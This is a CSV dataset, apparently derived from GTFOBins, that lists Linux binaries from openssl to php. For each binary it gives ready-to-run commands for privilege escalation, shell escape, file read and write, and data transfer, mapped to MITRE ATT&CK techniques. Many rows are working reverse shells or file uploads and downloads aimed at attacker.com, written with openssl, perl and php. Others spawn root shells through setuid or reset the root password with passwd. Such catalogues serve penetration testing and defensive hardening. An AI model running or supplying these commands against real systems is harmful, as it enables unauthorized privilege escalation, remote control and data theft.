1221,Linux,echo DATA | openssl enc -out /path/to/output-file,Abuse the 'openssl' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/openssl/
1222,Linux,openssl enc -in /path/to/input-file -out /path/to/output-file,Abuse the 'openssl' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/openssl/
1223,Linux,openssl enc -in /path/to/input-file -out /path/to/output-file,Abuse the 'openssl' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/openssl/
1224,Linux,openssl enc -in /path/to/input-file -out /path/to/output-file,Abuse the 'openssl' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/openssl/
1225,Linux,openssl req -engine ./lib.so,Abuse the 'openssl' binary (library load) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/openssl/
1226,Linux,openssl req -engine ./lib.so,Abuse the 'openssl' binary (library load) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/openssl/
1227,Linux,openssl req -engine ./lib.so,Abuse the 'openssl' binary (library load) in a unprivileged context to escalate privileges or execute arbitrary actions.,Library Load Hijack,Medium,T1574.006,https://gtfobins.github.io/gtfobins/openssl/
1228,Linux,mkfifo /path/to/temp-socket /bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect attacker.com:12345 >/path/to/temp-socket,Abuse the 'openssl' binary (reverse shell) in a sudo context to escalate privileges or execute arbitrary actions. The shell process is not spawn by `openssl`.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/openssl/
1229,Linux,mkfifo /path/to/temp-socket /bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect attacker.com:12345 >/path/to/temp-socket,Abuse the 'openssl' binary (reverse shell) in a suid context to escalate privileges or execute arbitrary actions. The shell process is not spawn by `openssl`.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/openssl/
1230,Linux,mkfifo /path/to/temp-socket /bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect attacker.com:12345 >/path/to/temp-socket,Abuse the 'openssl' binary (reverse shell) in a unprivileged context to escalate privileges or execute arbitrary actions. The shell process is not spawn by `openssl`.,Reverse Shell,High,T1059,https://gtfobins.github.io/gtfobins/openssl/
1231,Linux,openssl s_client -quiet -connect attacker.com:12345 </path/to/input-file,Abuse the 'openssl' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/openssl/
1232,Linux,openssl s_client -quiet -connect attacker.com:12345 </path/to/input-file,Abuse the 'openssl' binary (upload) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/openssl/
1233,Linux,openssl s_client -quiet -connect attacker.com:12345 </path/to/input-file,Abuse the 'openssl' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/openssl/
1234,Linux,openvpn --config /path/to/input-file,Abuse the 'openvpn' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is actually parsed and the first partial wrong line is returned in an error message.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/openvpn/
1235,Linux,openvpn --config /path/to/input-file,Abuse the 'openvpn' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is actually parsed and the first partial wrong line is returned in an error message.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/openvpn/
1236,Linux,openvpn --config /path/to/input-file,Abuse the 'openvpn' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is actually parsed and the first partial wrong line is returned in an error message.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/openvpn/
1237,Linux,openvpn --dev null --script-security 2 --up '/bin/sh -s',Abuse the 'openvpn' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/openvpn/
1238,Linux,openvpn --dev null --script-security 2 --up '/bin/sh -p -s',Abuse the 'openvpn' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/openvpn/
1239,Linux,openvpn --dev null --script-security 2 --up '/bin/sh -s',Abuse the 'openvpn' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/openvpn/
1240,Linux,openvt -- /path/to/command,Abuse the 'openvt' binary (command) in a sudo context to escalate privileges or execute arbitrary actions. The command execution is displayed on the virtual console.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/openvt/
1241,Linux,rpm opkg install x_1.0_all.deb,Abuse the 'opkg' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. Generate the Debian package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` echo 'exec /bin/sh' >x.sh fpm -n x -s dir -t deb -a all --before-install x.sh . ```,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/opkg/
1242,Linux,pandoc -t plain /path/to/input-file,Abuse the 'pandoc' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/pandoc/
1243,Linux,pandoc -t plain /path/to/input-file,Abuse the 'pandoc' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/pandoc/
1244,Linux,pandoc -t plain /path/to/input-file,Abuse the 'pandoc' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/pandoc/
1245,Linux,echo DATA | pandoc -t plain -o /path/to/output-file,Abuse the 'pandoc' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/pandoc/
1246,Linux,echo DATA | pandoc -t plain -o /path/to/output-file,Abuse the 'pandoc' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/pandoc/
1247,Linux,echo DATA | pandoc -t plain -o /path/to/output-file,Abuse the 'pandoc' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/pandoc/
1248,Linux,echo '...' >/path/to/temp-file pandoc -L /path/to/temp-file /dev/null,Abuse the 'pandoc' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/pandoc/
1249,Linux,echo '...' >/path/to/temp-file pandoc -L /path/to/temp-file /dev/null,Abuse the 'pandoc' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/pandoc/
1250,Linux,echo '...' >/path/to/temp-file pandoc -L /path/to/temp-file /dev/null,Abuse the 'pandoc' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/pandoc/
1251,Linux,echo -e 'x\nx' | passwd,"Abuse the 'passwd' binary (privilege escalation) in a sudo context to escalate privileges or execute arbitrary actions. This changes the root password to `x`, so it's now possible to log in using, for example, `su`.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/passwd/
1252,Linux,paste /path/to/input-file,Abuse the 'paste' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/paste/
1253,Linux,paste /path/to/input-file,Abuse the 'paste' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/paste/
1254,Linux,paste /path/to/input-file,Abuse the 'paste' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/paste/
1255,Linux,pax -w /path/to/input-file | tar -xO,Abuse the 'pax' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/pax/
1256,Linux,pax -w /path/to/input-file | tar -xO,Abuse the 'pax' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/pax/
1257,Linux,pax -w /path/to/input-file | tar -xO,Abuse the 'pax' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/pax/
1258,Linux,echo '...' >/path/to/temp-file pdb /path/to/temp-file cont,Abuse the 'pdb' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Python code (`...`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/pdb/
1259,Linux,echo '...' >/path/to/temp-file pdb /path/to/temp-file cont,Abuse the 'pdb' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Python code (`...`).,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/pdb/
1260,Linux,pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}' pdftotext texput.pdf -,Abuse the 'pdflatex' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The read file will be part of the PDF output.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/pdflatex/
1261,Linux,pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}' pdftotext texput.pdf -,Abuse the 'pdflatex' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The read file will be part of the PDF output.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/pdflatex/
1262,Linux,pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}' pdftotext texput.pdf -,Abuse the 'pdflatex' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The read file will be part of the PDF output.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/pdflatex/
1263,Linux,pdflatex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}',"Abuse the 'pdflatex' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. The file can only be written in the current directory, and the `.tex` extension is mandatory.",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/pdflatex/
1264,Linux,pdflatex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}',"Abuse the 'pdflatex' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. The file can only be written in the current directory, and the `.tex` extension is mandatory.",SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/pdflatex/
1265,Linux,pdflatex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}',"Abuse the 'pdflatex' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. The file can only be written in the current directory, and the `.tex` extension is mandatory.",Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/pdflatex/
1266,Linux,pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',Abuse the 'pdflatex' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/pdflatex/
1267,Linux,pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',Abuse the 'pdflatex' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/pdflatex/
1268,Linux,pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',Abuse the 'pdflatex' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/pdflatex/
1269,Linux,pdftex --shell-escape '\write18{/bin/sh}\end',Abuse the 'pdftex' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/pdftex/
1270,Linux,pdftex --shell-escape '\write18{/bin/sh}\end',Abuse the 'pdftex' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/pdftex/
1271,Linux,pdftex --shell-escape '\write18{/bin/sh}\end',Abuse the 'pdftex' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/pdftex/
1272,Linux,perf stat /bin/sh,Abuse the 'perf' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/perf/
1273,Linux,perf stat /bin/sh -p,Abuse the 'perf' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/perf/
1274,Linux,perf stat /bin/sh,Abuse the 'perf' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/perf/
1275,Linux,"perl -MIO::Socket::INET -e '$s=new IO::Socket::INET(PeerAddr=>""attacker.com"",PeerPort=>80,Proto=>""tcp"") or die; print $s ""GET /path/to/input-file HTTP/1.1\r\nHost: attacker.com\r\nMetadata: true\r\nConnection: close\r\n\r\n""; open(my $fh, "">"", ""/path/to/output-file"") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq ""\r\n"") { $in_content = 1; } } close($s); close($fh);'",Abuse the 'perl' binary (download) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/perl/
1276,Linux,"perl -MIO::Socket::INET -e '$s=new IO::Socket::INET(PeerAddr=>""attacker.com"",PeerPort=>80,Proto=>""tcp"") or die; print $s ""GET /path/to/input-file HTTP/1.1\r\nHost: attacker.com\r\nMetadata: true\r\nConnection: close\r\n\r\n""; open(my $fh, "">"", ""/path/to/output-file"") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq ""\r\n"") { $in_content = 1; } } close($s); close($fh);'",Abuse the 'perl' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/perl/
1277,Linux,perl -ne print /path/to/input-file,Abuse the 'perl' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/perl/
1278,Linux,perl -ne print /path/to/input-file,Abuse the 'perl' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/perl/
1279,Linux,perl -ne print /path/to/input-file,Abuse the 'perl' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/perl/
1280,Linux,"perl -e 'use Socket;$i=""attacker.com"";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'",Abuse the 'perl' binary (reverse shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/perl/
1281,Linux,"perl -e 'use Socket;$i=""attacker.com"";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'",Abuse the 'perl' binary (reverse shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Reverse Shell,High,T1059,https://gtfobins.github.io/gtfobins/perl/
1282,Linux,"perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec ""/bin/sh""'",Abuse the 'perl' binary (shell) in a capabilities context to escalate privileges or execute arbitrary actions.,Capabilities Abuse,Critical,T1548.001,https://gtfobins.github.io/gtfobins/perl/
1283,Linux,"perl -e 'exec ""/bin/sh""'",Abuse the 'perl' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/perl/
1284,Linux,"perl -e 'exec ""/bin/sh""'",Abuse the 'perl' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/perl/
1285,Linux,"PERL5OPT=-d PERL5DB='exec ""/bin/sh""' perl /dev/null","Abuse the 'perl' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. The `/dev/null` part can be omitted, just use `Ctrl-D` in order to spawn the shell.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/perl/
1286,Linux,"PERL5OPT=-d PERL5DB='exec ""/bin/sh""' perl /dev/null","Abuse the 'perl' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. The `/dev/null` part can be omitted, just use `Ctrl-D` in order to spawn the shell.",Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/perl/
1287,Linux,"perl -MIO::Socket::INET -e '$s = new IO::Socket::INET(PeerAddr=>""attacker.com"", PeerPort=>80, Proto=>""tcp"") or die;open(my $file, ""<"", ""/path/to/input-file"") or die;$content = join("""", <$file>);close($file);$headers = ""POST / HTTP/1.1\r\nHost: attacker.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: "" . length($content) . ""\r\nConnection: close\r\n\r\n"";print $s $headers . $content;while (<$s>) { }close($s);'",Abuse the 'perl' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/perl/
1288,Linux,"perl -MIO::Socket::INET -e '$s = new IO::Socket::INET(PeerAddr=>""attacker.com"", PeerPort=>80, Proto=>""tcp"") or die;open(my $file, ""<"", ""/path/to/input-file"") or die;$content = join("""", <$file>);close($file);$headers = ""POST / HTTP/1.1\r\nHost: attacker.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: "" . length($content) . ""\r\nConnection: close\r\n\r\n"";print $s $headers . $content;while (<$s>) { }close($s);'",Abuse the 'perl' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/perl/
1289,Linux,perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh #',Abuse the 'perlbug' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. This requires to press `Enter` serveral times before the shell is spawn.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/perlbug/
1290,Linux,perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh #',Abuse the 'perlbug' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. This requires to press `Enter` serveral times before the shell is spawn.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/perlbug/
1291,Linux,pexec /bin/sh,Abuse the 'pexec' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/pexec/
1292,Linux,pexec /bin/sh -p,Abuse the 'pexec' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/pexec/
1293,Linux,pexec /bin/sh,Abuse the 'pexec' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/pexec/
1294,Linux,pg /path/to/input-file,Abuse the 'pg' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/pg/
1295,Linux,pg /path/to/input-file,Abuse the 'pg' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/pg/
1296,Linux,pg /path/to/input-file,Abuse the 'pg' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/pg/
1297,Linux,pg /etc/hosts !/bin/sh,Abuse the 'pg' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/pg/
1298,Linux,pg /etc/hosts !/bin/sh,Abuse the 'pg' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/pg/
1299,Linux,pg /etc/hosts !/bin/sh,Abuse the 'pg' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/pg/
1300,Linux,"php -r 'echo shell_exec(""/path/to/command"");'",Abuse the 'php' binary (command) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/php/
1301,Linux,"php -r 'echo shell_exec(""/path/to/command"");'",Abuse the 'php' binary (command) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/php/
1302,Linux,"php -r 'echo shell_exec(""/path/to/command"");'",Abuse the 'php' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/php/
1303,Linux,"php -r '$r=array(); exec(""/path/to/command"", $r); print(join(""\n"",$r));'",Abuse the 'php' binary (command) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/php/
1304,Linux,"php -r '$r=array(); exec(""/path/to/command"", $r); print(join(""\n"",$r));'",Abuse the 'php' binary (command) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/php/
1305,Linux,"php -r '$r=array(); exec(""/path/to/command"", $r); print(join(""\n"",$r));'",Abuse the 'php' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/php/
1306,Linux,"php -r '$p = array(array(""pipe"",""r""),array(""pipe"",""w""),array(""pipe"", ""w""));$h = @proc_open(""/path/to/command"", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'",Abuse the 'php' binary (command) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/php/
1307,Linux,"php -r '$p = array(array(""pipe"",""r""),array(""pipe"",""w""),array(""pipe"", ""w""));$h = @proc_open(""/path/to/command"", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'",Abuse the 'php' binary (command) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/php/
1308,Linux,"php -r '$p = array(array(""pipe"",""r""),array(""pipe"",""w""),array(""pipe"", ""w""));$h = @proc_open(""/path/to/command"", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'",Abuse the 'php' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/php/
1309,Linux,"php -r '$c=file_get_contents(""http://attacker.com/path/to/input-file""); file_put_contents(""/path/to/output-file"", $c);'",Abuse the 'php' binary (download) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/php/
1310,Linux,"php -r '$c=file_get_contents(""http://attacker.com/path/to/input-file""); file_put_contents(""/path/to/output-file"", $c);'",Abuse the 'php' binary (download) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/php/
1311,Linux,"php -r '$c=file_get_contents(""http://attacker.com/path/to/input-file""); file_put_contents(""/path/to/output-file"", $c);'",Abuse the 'php' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/php/
1312,Linux,"php -r 'readfile(""/path/to/input-file"");'",Abuse the 'php' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/php/
1313,Linux,"php -r 'readfile(""/path/to/input-file"");'",Abuse the 'php' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/php/
1314,Linux,"php -r 'readfile(""/path/to/input-file"");'",Abuse the 'php' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/php/
1315,Linux,"php -r 'file_put_contents(""/path/to/output-file"", ""DATA"");'",Abuse the 'php' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/php/
1316,Linux,"php -r 'file_put_contents(""/path/to/output-file"", ""DATA"");'",Abuse the 'php' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/php/
1317,Linux,"php -r 'file_put_contents(""/path/to/output-file"", ""DATA"");'",Abuse the 'php' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/php/
1318,Linux,"php -r '$sock=fsockopen(""attacker.com"",12345);exec(""/bin/sh -i 0<&3 1>&3 2>&3"");'",Abuse the 'php' binary (reverse shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/php/
1319,Linux,"php -r '$sock=fsockopen(""attacker.com"",12345);exec(""/bin/sh -i 0<&3 1>&3 2>&3"");'",Abuse the 'php' binary (reverse shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/php/
1320,Linux,"php -r '$sock=fsockopen(""attacker.com"",12345);exec(""/bin/sh -i 0<&3 1>&3 2>&3"");'",Abuse the 'php' binary (reverse shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Reverse Shell,High,T1059,https://gtfobins.github.io/gtfobins/php/
1321,Linux,"php -r 'posix_setuid(0); system(""/bin/sh -i"");'",Abuse the 'php' binary (shell) in a capabilities context to escalate privileges or execute arbitrary actions.,Capabilities Abuse,Critical,T1548.001,https://gtfobins.github.io/gtfobins/php/
1322,Linux,"php -r 'system(""/bin/sh -i"");'",Abuse the 'php' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/php/
1323,Linux,"php -r 'system(""/bin/sh -i"");'",Abuse the 'php' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/php/
1324,Linux,"php -r 'system(""/bin/sh -i"");'",Abuse the 'php' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/php/
1325,Linux,"php -r 'posix_setuid(0); passthru(""/bin/sh -i"");'",Abuse the 'php' binary (shell) in a capabilities context to escalate privileges or execute arbitrary actions.,Capabilities Abuse,Critical,T1548.001,https://gtfobins.github.io/gtfobins/php/
1326,Linux,"php -r 'passthru(""/bin/sh -i"");'",Abuse the 'php' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/php/
1327,Linux,"php -r 'passthru(""/bin/sh -i"");'",Abuse the 'php' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/php/
